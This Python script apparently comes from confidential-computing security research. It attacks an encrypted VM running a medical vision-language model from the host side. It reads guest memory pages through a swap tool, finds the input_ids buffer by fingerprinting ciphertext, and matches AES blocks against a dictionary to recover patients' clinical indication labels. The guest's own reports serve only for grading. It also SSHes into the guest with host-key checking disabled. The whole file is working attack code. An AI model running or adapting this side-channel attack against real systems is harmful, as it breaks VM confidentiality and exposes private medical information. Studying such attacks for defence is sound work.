#!/usr/bin/env python3
"""
llm_e2e2.py — full host-only end-to-end string recovery, reusing orchestrate's
proven phase-aware matcher.

  (B) host-derive the input_ids base GPA via the image_pad ciphertext
      fingerprint (no guest-reported GPA in the algorithm), then
  (C) hand that base to orchestrate_v4.sweep_blind (fully-blind path:
      _estimate_pad_bounds locates the pad run + header, per-phase dict
      references handle AES-block alignment) -> recovered clinical labels.

The guest holds one input_ids buffer (gpa-only) and reports its GPA/indication
ONLY so we can grade; the recovery uses host_base derived in (B).

Run:  sudo PYTHONPATH=dict python3 llm_e2e2.py --index 2 --window 16
"""
import argparse
import json
import re
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE / "dict"))
sys.path.insert(0, str(HERE.parent / "mura" / "dict"))
sys.path.insert(0, str(HERE))

from mura_dict_build import (  # noqa: E402
    acquire_gpa, do_swap_read, parse_dump, ensure_mtu_9000, drain_rxbuf,
    CHUNK_SIZE, CHUNKS_PAGE, PAGE_SIZE, SWAP_PACE_SEC,
    SWAP_BURST_COOLDOWN, SWAP_BURST_SLEEP,
)
import numpy as np  # noqa: E402
import orchestrate_v4 as o  # noqa: E402

SWAP_TOOL = str(HERE / "swap_pages_tool")
IMAGE_PAD_TOKEN_ID = 151655
SCAN_TMP = HERE / "scan_tmp_llm"
DICT_CACHE = HERE / "dict_cache_v4.json"

KEY = "/home/eun/.ssh/id_ed25519"
GUEST = "ubuntu@localhost"; GPORT = "7777"
GUEST_PY = "/home/ubuntu/miniconda3/envs/vlm/bin/python3"
GUEST_CWD = "~/medical_ml/med_vlm/scripts"
GSCRIPT = "single_inference_indication_gpa.py"
SSH = ["ssh", "-p", GPORT, "-i", KEY, "-o", "BatchMode=yes",
       "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8", GUEST]


def _blk(b, j): return b[j*CHUNK_SIZE:(j+1)*CHUNK_SIZE]
def imagepad_chunk(): return np.array([IMAGE_PAD_TOKEN_ID]*2, dtype="<i8").tobytes()


def read_at_fixed(fixed, src, tag):
    SCAN_TMP.mkdir(exist_ok=True)
    tmp = SCAN_TMP / f"{tag}.out"
    do_swap_read(fixed, src, tmp, SWAP_TOOL)
    d = parse_dump(tmp); tmp.unlink(missing_ok=True); return d


def valid_imagepad_ref(fixed, zero, tries=5):
    best, best_mask = None, set()
    for t in range(tries):
        g = acquire_gpa(IMAGE_PAD_TOKEN_ID, chunk_bytes=imagepad_chunk())
        cur = read_at_fixed(fixed, g, f"ip{t}")
        mask = {j for j in range(CHUNKS_PAGE) if _blk(cur, j) != _blk(zero, j)}
        if len(mask) > len(best_mask):
            best, best_mask = cur, mask
        if len(best_mask) >= 200:
            break
        try: drain_rxbuf(rounds=1)
        except Exception: pass
        time.sleep(1)
    return best, best_mask


def hold_guest(index):
    cmd = (f"cd {GUEST_CWD} && sudo {GUEST_PY} -u {GSCRIPT} "
           f"--gpa-only --calibrate --stdin-loop")
    g = subprocess.Popen(SSH + [cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, text=True, bufsize=1)
    for l in g.stdout:
        if "LOOP_READY" in l: break
    g.stdin.write(f"{index}\n"); g.stdin.flush()
    gt = {"base": None, "N": None, "tok_start": None, "ind": None}
    grab_ind = False
    for l in g.stdout:
        if "INDICATION (sample id" in l:
            grab_ind = True; continue
        if grab_ind and gt["ind"] is None and l.strip() and "====" not in l:
            gt["ind"] = l.strip(); grab_ind = False
        m = re.search(r"input_ids base page GPA:\s+0x([0-9a-f]+)", l, re.I)
        if m: gt["base"] = int(m.group(1), 16)
        m = re.search(r"N_image_pad:\s+(\d+)", l)
        if m: gt["N"] = int(m.group(1))
        m = re.search(r"tok_start:\s+(\d+)", l)
        if m: gt["tok_start"] = int(m.group(1))
        if "HOLDING" in l: break
    return g, gt


def find_base(fixed, ip_ref, ip_mask, center_page, window):
    best_page, best_hits = None, -1
    n = 0
    for d in range(-window, window + 1):
        page = center_page + d * PAGE_SIZE
        if SWAP_BURST_COOLDOWN and n and n % SWAP_BURST_COOLDOWN == 0:
            time.sleep(SWAP_BURST_SLEEP)
        else:
            time.sleep(SWAP_PACE_SEC)
        n += 1
        data = read_at_fixed(fixed, page, "pg")
        hits = sum(1 for j in ip_mask if _blk(data, j) == _blk(ip_ref, j))
        if hits > best_hits:
            best_page, best_hits = page, hits
    return best_page, best_hits


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--index", type=int, default=2)
    p.add_argument("--window", type=int, default=16,
                   help="pages each side of the buffer to scan for input_ids "
                        "(stands in for a tracker candidate block)")
    args = p.parse_args()

    if not DICT_CACHE.exists():
        print(f"[!] {DICT_CACHE} missing — run --build first", file=sys.stderr); return
    cache = json.load(open(DICT_CACHE))
    print(f"[e2e] loaded dict: {len(cache)} offset keys")

    ensure_mtu_9000()
    print(f"[hold] guest index {args.index} ...")
    g, gt = hold_guest(args.index)
    if gt["base"] is None:
        print("[!] hold failed", file=sys.stderr); return
    print(f"[hold] GT(grade): base=0x{gt['base']:x} N={gt['N']} tok_start={gt['tok_start']}")
    print(f"[hold] GT indication: {gt['ind']!r}")

    try:
        fixed = acquire_gpa(None)
        zero = read_at_fixed(fixed, acquire_gpa(None), "zero")
        ip_ref, ip_mask = valid_imagepad_ref(fixed, zero)
        print(f"[B] image_pad ref confirmed offsets: {len(ip_mask)}/256")
        if len(ip_mask) < 100:
            print("[!] weak image_pad ref", file=sys.stderr); return

        host_base, hits = find_base(fixed, ip_ref, ip_mask, gt["base"], args.window)
        print(f"[B] host-derived input_ids base = 0x{host_base:x} "
              f"({hits}/{len(ip_mask)} image_pad)  GT=0x{gt['base']:x}  "
              f"match={host_base == gt['base']}")

        print("[C] handing host_base to orchestrate.sweep_blind (fully-blind)...")
        matches, N_est = o.sweep_blind(host_base, cache, SWAP_TOOL)

        print("\n" + "=" * 68)
        print(f"  END-TO-END RESULT  (index {args.index})")
        print("=" * 68)
        print(f"  GT indication : {gt['ind']!r}")
        print(f"  N_est (host)  : {N_est}")
        if matches:
            labels = [m["label"] for m in matches]
            print(f"  RECOVERED labels ({len(matches)}):")
            for m in sorted(matches, key=lambda x: x["tok_start"]):
                print(f"    tok={m['tok_start']} idx={m['token_idx']} "
                      f"'{m['label']}' blocks={m['n_blocks']}")
            recon = " / ".join(labels)
            print(f"  --> {recon}")
            ok = any(lbl.strip().lower() in (gt["ind"] or "").lower() for lbl in labels)
            print(f"  recovered label ⊂ indication text: {ok}")
        else:
            print("  RECOVERED: (none)")
        print("=" * 68)
    finally:
        try:
            g.stdin.write("QUIT\n"); g.stdin.flush(); g.wait(timeout=15)
        except Exception:
            g.kill()


if __name__ == "__main__":
    main()
